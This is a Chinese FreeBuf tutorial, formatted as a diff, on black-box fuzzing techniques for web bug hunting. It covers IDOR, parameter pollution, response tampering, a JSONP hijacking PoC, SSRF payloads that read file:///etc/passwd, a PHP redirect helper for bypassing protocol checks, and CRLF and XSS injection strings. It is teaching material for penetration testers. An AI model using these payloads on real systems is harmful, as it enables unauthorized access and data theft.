@@ -1,0 +1,448 @@
+**之前写过一个比较入门的[漏洞挖掘浅谈](https://xz.aliyun.com/t/5398)，而之后的漏洞挖掘和工作中的产品测试过程中除了白盒代码审计之外比较偏向黑盒测试/漏洞挖掘，那么我觉得漏洞挖掘/黑盒测试过程中的遇到过的一些fuzz技术思想有必要借用我遇到过的实战中的例子来归纳总结下，通过实例对fuzz的思想进行展开。**
+
+## 一、登陆
+
+ **1）验证码**
+
+图片验证码1 ->拒绝服务攻击
+
+-》Fuzz存在潜藏参数，可控验证码生成大小： 如存在验证码生成包中存在height、width、length等参数且能够被我们控制那么就可能进行拒绝服务攻击![code](https://image.3001.net/images/20191125/1574691522_5ddbe2c2f2ad0.png!small)
+
+![code](https://image.3001.net/images/20191125/1574691641_5ddbe33960399.jpg!small)
+
+图片验证码2->删除验证码参数bypass验证
+
+手机验证码1->爆破
+
+手机验证码2->短信轰炸
+
+ **2）用户名枚举**
+
+若测试中回显信息出现用户名不存在、或者回显code与正确的code不同时则可能存在用户名枚举
+
+![1.png](https://image.3001.net/images/20191125/1574691833_5ddbe3f9966a6.png!small)  
+
+ **3）弱口令**
+
+##  **二、逻辑漏洞**
+
+### 2.1敏感信息泄露（接口参数fuzz+驼峰命名法）
+
+原本是一个如下一个根据个人信息显示订单的请求数据包
+
+    
+    
+    POST /sale/appOrder/orderInfo HTTP/1.1
+    Host: xxx.com
+    Origin: http://xxx.com
+    Cookie:****
+    ...
+    
+    orderId=1234
+    
+
+返回的一个正常的个人订单信息。然而我将post的内容删除后，请求接口上继续Fuzz参数并配合驼峰命名规则
+
+    
+    
+    POST /sale/appOrder/+paramFuzzing HTTP/1.1
+    Host: xxx.com
+    Origin: http://xxx.com
+    Cookie:****
+    ...
+    
+
+最终得到大量订单信息的泄露
+
+![2](https://image.3001.net/images/20191125/1574691868_5ddbe41cbd550.png!small)
+
+### 2.2逻辑漏洞-越权1（参数值替换）
+
+将相关的信息字段内容替换为测试账号B的信息（例如：login=A-> login=B
+
+、userid=A->userid=B）
+
+![4](https://image.3001.net/images/20191125/1574691897_5ddbe4393dbcd.png!small)
+
+### 2.3逻辑漏洞-越权2（参数值枚举）
+
+对于以上情况在不知道账户2的id或不想另注册测试账户时用到另一种暴力而简便方法，可能大家都知道intruder.
+
+![5](https://image.3001.net/images/20191125/1574691961_5ddbe479b0653.png!small)
+
+![6](https://image.3001.net/images/20191125/1574691984_5ddbe4907b9ef.png!small)
+
+### 2.4逻辑漏洞-IDOR（IDOR-不安全的直接对象引用）
+
+IDOR或许和越权有点像，在测试越权修改user_id时也许经常会看到401未认证或用户未授权，大多少人会和我之前的我一样结束这样一个越权测试，认为目标系统不存在越权漏洞。但在正是了解和接触IDOR之后测试面才会不断发散扩展。IDOR漏洞不仅限于参数数值更改，它还包括
+**参数数值删除** ，以及其他与个人信息相关的字段 **替换** 以及 **HTTP污染** 等。
+
+》举例
+
+假如请求中存在以下参数
+
+    
+    
+    {"userid":"",""meail":"","content":"","anmousid":"",user_hash":"",}
+    
+
+1）替换请求中的userid
+
+经常会出现
+
+A
+
+    
+    
+    HTTP/1.1 404
+    ....
+    error
+    
+
+B
+
+    
+    
+    HTTP/1.1 403
+    ....
+    error
+    
+
+C
+
+    
+    
+    HTTP/1.1 401
+    ...
+    未认证
+    
+
+2）删除请求中对应的token/user_hash
+
+保留userid,将与其对应的token/user_hash参数值删除 ,原例A->B
+
+3)删除userid及对应user_hash
+
+返回结果如B
+
+但是最后当将userid、user_hash、anmousid都删除只保留email和content时却认证成功返回了数据。
+
+对于C中情况测试还存在一个IDOR的Bypass， **HTTP参数污染。**
+
+![8](https://image.3001.net/images/20191125/1574692019_5ddbe4b303495.png!small)
+
+如图一个资产可能存在多种服务或程序，他们的请求或处理或参数解析方面可能存在不同，即平常所说的解析差异。那么我们可以发送一个数值参数来造成WEB应用后端的解析混乱，当我们发送多个数值参数又会如何？那么我们可以发送具备不同数值的同名参数去混乱Web后端解析机制，通过这种攻击来（HTTP参数污染-HPP）实现我们的IDOR Bypass。由于测试中未遇到过此bypass漏洞，这里借用大佬的一张图作为例子
+
+![7](https://image.3001.net/images/20191125/1574692035_5ddbe4c312b7b.png!small)
+
+具体可参考<https://www.freebuf.com/vuls/216774.html>
+
+###  **2.5回显伪造-本地验证**
+
+当回显error时替换换为正确的回显内容，绕过验证
+
+1）获取验证码后任意输入一个验证码。![img](https://image.3001.net/images/20191125/1574692185_5ddbe559e9bfc.png!small)
+
+2）抓包放行，得到的返回包如下![img](https://image.3001.net/images/20191125/1574692406_5ddbe6362a14c.png!small)
+
+3）抓包改返回包修改为正确的返回包覆盖错误的返回包，如下
+
+{“code”:1,”data”:”目标用户手机号”,”msg”:”绑定成功Ÿ”}![img](https://image.3001.net/images/20191125/1574692414_5ddbe63e681eb.png!small)
+
+4）放行，修改成功![img](https://image.3001.net/images/20191125/1574692428_5ddbe64caa6f1.png!small)
+
+漏洞本质：服务端没有对用户的上一步操作进行验证
+
+### 2.6逻辑漏洞->【参数fuzz】->未授权
+
+得到一个某后台管理系统的URL:[https://xxx/?m=index，该URL访问解析过来的是主⻚信息。](https://xxx/?m=index%EF%BC%8C%E8%AF%A5URL%E8%AE%BF%E9%97%AE%E8%A7%A3%E6%9E%90%E8%BF%87%E6%9D%A5%E7%9A%84%E6%98%AF%E4%B8%BB%E2%BB%9A%E4%BF%A1%E6%81%AF%E3%80%82)
+
+尝试对请求参数m的值进行Fuzz，利用参数字典进行Fuzz，方法和前面的敏感信息泄露（接口参数fuzz方法）类似。
+
+###  **2.7逻辑漏洞-越权- >js信息接口fuzz**
+
+当遇到一个只有登陆框的网站时，我们能得到的信息少之又少时，查看源码fuzz网站的js信息能得到意想不到的收获，如隐藏的域名和接口。
+
+1）敏感接口
+
+![9](https://image.3001.net/images/20191125/1574692751_5ddbe78f140d9.png!small)
+
+一般可能出现越权或未授权漏洞
+
+2）隐藏域名
+
+我在挖掘末src某网站xxx.cn时，一番努力之后发现并无所获，而这时通过查看源码，意外的发现一个特殊的域名 **bbs.abc.com**
+,我在其后面加上admin之后意外的跳转到了<https://bbs.abc.com/admin/#/home/dashboard>
+后台，该bbs.abc.com为xxx.cn开发人员的一个测试网站存在着大量后台接口越权。
+
+![10](https://image.3001.net/images/20191125/1574692770_5ddbe7a2e9807.png!small)
+
+![11](https://image.3001.net/images/20191125/1574692909_5ddbe82dac930.png!small)
+
+## 三、XXE-Fuzzing
+
+对于xxe的测试，是当一个数据包的中出现
+
+    
+    
+    <?xml version='1.0' encoding='utf-8' ?>
+    <!DOCTYPE ...
+    ...
+    ?>
+    
+
+即对XML文件进行解析的场景中，都有可能出现XXE注入，如提交时，还有在上传中文件类型指定了excel、or
+word那么都可以进行Fuzz测试。关于XXE详细的利用可参考我之前的[
+**PHP与J**A之XXE漏洞详解与审计**](http://qclover.cn/2019/11/14/PHP%E4%B8%8EJ**A%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%AE%A1%E8%AE%A1.html)记录了白盒审计及黑盒测试利用详细的过程。
+
+##  **四、CSRF-Fuzzing**
+
+#### 读取型CSRF
+
+1)jsonp 劫持
+
+![1573991576207](https://image.3001.net/images/20191125/1574692966_5ddbe866465c5.png!small)
+
+POC
+
+    
+    
+    <script>function jsonp(data){alert(JSON.stringify(data));}</script>
+    <script src="http://vul.com/user/center?callback=jsonp"></script>
+    
+
+2)cors ->crossdomain.xml->flash
+
+若测试某资产时发现存在crossdomain.xml,并且内容如下：
+
+    
+    
+    <?xml version="1.0"?>
+    <cross-domain-policy>
+      <allow-access-from domain="*" />
+    </cross-domain-policy>
+    
+
+则存在swf的跨域的读取CSRF
+
+![img](https://raw.githubusercontent.com/Qclover/CSRF/master/BypassX-Request-With/2.png)
+
+详细利用可参考我之前的利用方式的[记录](https://github.com/Qclover/CSRF)里面包含了poc构造工具。另外关于CSRF的利用及其防护也可参考之前的[一篇文章](https://xz.aliyun.com/t/6414)。
+
+3)CORS跨域资源请求
+
+在请求的时候加上了请求头 `Origin: <http://xxx.com>`，而对应的响应包中出现了`Access-Control-Allow-Origin:
+[http://vul.com这个响应头其实就是访问控制允许，在这里是允许http://vul.cm的请求的，所以目标http://vul.com是可以被跨域读取该网址的内容]()
+
+##  **五、SSRF-or-URL跳转漏洞ext-Fuzzing**
+
+资产测试时可能存在这样的URL:
+
+    
+    
+    http://www.xxx.com/vul.php?url=http://www.xxc.com/xxx.jpg
+    https://xxx.com/notice/?info=xxx&gourl=
+    https://xxx.com/api/?uri=xxx&redict=
+    
+
+对于如上这样的GET型的链接Fuzz的点有什么呢？SSRF、url跳转，结束了吗?ext扩展发散一下其实还有，只是平常利用的比较少或比较少想到在一次机缘巧合刚好想到也刚好遇上了，继续fuzzing下，其实还可以考虑
+**CRLF** ，url_redict+CRLF、CRLF+XSS。
+
+ **对于SSRF**
+
+测试
+
+    
+    
+    http://www.xxx.com/vul.php?url=http://127.0.0.1:port
+    
+
+根据回显内容和状态即可确定漏洞是否存在。
+
+协议利用
+
+    
+    
+    gopher
+    http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test
+    dict
+    http://4o4notfound.org/ssrf.php?url=dict://127.0.0.1:port/info
+    file
+    http://4o4notfound.org/ssrf.php?url=file:///etc/passwd
+    http
+    http://4o4notfound.org/ssrf.php?url=http://xxx.com/302.php
+    
+
+协议限制为http下向服务端提交302.php
+
+    
+    
+    <?php
+    header("Location: file:///etc/passwd");
+    ?>
+    
+
+辅助脚本302.php—-bypass http协议限制
+
+    
+    
+    <?php
+    
+    $ip = $_GET['ip'];
+    
+    $port = $_GET['port'];
+    
+    $scheme = $_GET['s'];
+    
+    $data = $_GET['data'];
+    
+    header("Location: $scheme://$ip:$port/$data"); ?>
+    
+
+测试完SSRF后发现没有该漏洞~
+
+![1574431569568](https://image.3001.net/images/20191125/1574693054_5ddbe8bea5215.png!small)
+
+![1574431518002](https://image.3001.net/images/20191125/1574693106_5ddbe8f22dc45.png!small)
+
+转入URL跳转测试
+
+![1574431730099](https://image.3001.net/images/20191125/1574693125_5ddbe9059edad.png!small)
+
+![1574431772440](https://image.3001.net/images/20191125/1574693143_5ddbe917910e7.png!small)
+
+结束了么？没有，那么是否还存在其他利用方式呢？
+
+往下测试之前，我们先来看看URL跳转以及 **CRLF** 的原理.
+
+ **插叙**
+
+CRLF 指的是 **回车符** (CR，ASCII 13，\r，%0d) 和 **换行符** (LF，ASCII 10，\n，%0a)。
+
+正常的一个请求
+
+    
+    
+    GET api/xxxx/?url=http://www.xxc.com
+    Host:qclover.cn
+    User-Agent:xxxxx
+    ...
+    Referer:http:qclover.cn
+    Cookie:xxxxxxxxxx
+    ...
+    
+
+抓包，在请求行的url参数中加入特殊构造的CRLF字符 如下
+
+    
+    
+    GET api/xxxx/?url=http://www.xxc.com%0d%0aSet-Cookie:vuale=crlf HTTP/1.1
+    Host:qclover.cn
+    User-Agent:xxxxx
+    ...
+    Referer:http:qclover.cn
+    Cookie:xxxxxxxxxx
+    ...
+    
+
+输出
+
+    
+    
+    HTTP/1.1 302 Found
+    ...
+    Location:http://www.xxc.com
+    Set-Cookie:vuale=crlf
+    Content-Length:0
+    Content-Type:text/html
+    
+
+这样一个CRLF对应的服务端的代码可能是这样子的
+
+    
+    
+    if(isset($_GET["url"])&&($_cookie["security_level"]!="1"&&$_COOKIE["security_level"]!="2"))
+    {
+        header("Location:".GET["url"]);
+        exit;
+    }
+    
+
+代码的意思是当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。
+
+假设存在CRLF漏洞，响应包此时应该 会出现如下情况
+
+    
+    
+    HTTP/1.1 302 Found
+    ...
+    Location:http://www.xxc.com%0d%0aSet-Cookie:vuale=crlf
+    Content-Length:0
+    Content-Type:text/html
+    
+
+最终构造的Set-Cookie字符 会出现在HTTP头部的Cookie中且vuale=crlf会被设置成Cookie携带在Cookie中。
+最终的数据包会如下：
+
+    
+    
+    GET api/xxxx/?url=http://www.xxc.com
+    Host:qclover.cn
+    User-Agent:xxxxx
+    ...
+    Referer:http:qclover.cn
+    Cookie:xxxxxxxxxx;vuale=crlf
+    ...
+    
+
+了解CRLF的服务端的代码原理后，可以知道本质还是在代码中的Location,这与url（302）跳转类似，因此在存在url跳转的情况下还可以尝试Fuzz,转为url跳转->CRLF->CRLF+XSS的利用
+
+CRLF+XSS,payload可以更改为
+
+    
+    
+    GET /xxxx/redirect=http://www.xxc.com%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+    ...
+    
+
+会变成`->`
+
+    
+    
+    GET /xxxx/redirect（CRLF）
+    Host:qclover.cn
+    content-type:text/html（CRLF）
+    location:<svg/onload=alert(innerHTML)>
+    
+
+若同时存在url跳转，payload可以变换一下,CRLF+XSS
+
+    
+    
+    GET api/xxxx/?url=http://www.xxc.com%0d%0aSet-Cookie:%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE HTTP/1.1
+    Host:qclover.cn
+    User-Agent:xxxxx
+    ...
+    Referer:http:qclover.cn
+    Cookie:xxxxxxxxxx
+    ...
+    
+
+那么`<svg/onload=alert`1`>`将会出现在cookie中。
+
+## 六、黑盒测试中的漏洞利用链FUZZ
+
+最后简单说下黑盒测试中的漏洞利用链的Fuzz思路
+
+在白盒代码审计中存在者多种的漏洞利用POP链如TP5-6的POP链曾被大多数人所发掘分析。而在黑盒测试审计中其实也存在可以利用漏洞链的思想。如对于功能及其组件的测试、就单纯的代码审计的情况下比较难发现其漏洞，一个压缩包上传代码中严格限制了其文件类型但会回显其上传的路径、而
+在另外一处备份恢复时首先会默认对其文件进行解压，若抓包中解压的路径可控，将两者组合利用就可进行木马上传和RCE。在fuzz中找各功能组件之间的关联性。
+
+在漏洞挖掘中，Fuzz中每一个漏洞都可能存在多样的利用方式，需要我们对每一个参数和漏洞点保持着善于发现和挖掘的思想或许会存在意外的收获，不断的渐渐前行~
+
+## 参考资料
+
+> <https://gh0st.cn/archives/2019-11-11/1>  
+>
+
+ ***本文作者：Qclover，转载请注明来自FreeBuf.COM**
+
